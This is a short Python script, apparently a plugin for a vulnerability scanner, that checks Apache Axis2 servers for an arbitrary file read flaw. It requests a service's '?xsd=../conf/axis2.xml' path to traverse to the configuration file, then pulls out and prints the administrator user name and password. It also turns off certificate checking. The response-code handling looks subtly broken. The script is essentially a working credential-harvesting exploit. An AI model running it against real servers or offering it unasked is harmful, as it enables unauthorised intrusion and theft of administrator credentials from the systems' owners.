# -*- coding:utf-8 -*-

import re
import requests
import urllib.request, urllib.error, urllib.parse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    timeout = 5
    print('testing if axis2 arbitrary file read vul')
    try:
        url = url + '/axis2/services/listServices'
        #res = urllib.request.urlopen(url, timeout=timeout)
        res = requests.get(url,verify=False,timeout=timeout)
        res_code = res.code
        res_html = res.text
        #res_html = res.read().decode('utf-8','ignore')
        if int(res_code) == 404 or int(res_code) == 502:
            msg = 'There is no axis2 arbitrary file read vul'
            number = 'v0'
            return False,url,number,msg
        else:
            pass
        m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
        if m.group(1):
            server_str = m.group(1)
            read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
            res = requests.get(read_url,verify=False,timeout=timeout)
            res_html = res.text
            #res = urllib.request.urlopen(read_url, timeout=timeout)
            #res_html = res.read().decode('utf-8','ignore')
            if 'axisconfig' in res_html:
                user = re.search('<parameter name="userName">(.*?)</parameter>', res_html)
                password = re.search('<parameter name="password">(.*?)</parameter>', res_html)
                msg = 'There is axis2 arbitrary file read vul on url: ' +read_url+ ' with %s:%s' % (user.group(1), password.group(1))
                print(msg)
                number = 'v29'
                return True,url,number,msg
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no axis2 arbitrary file read vul'
    number = 'v0'
    return False,url,number,msg




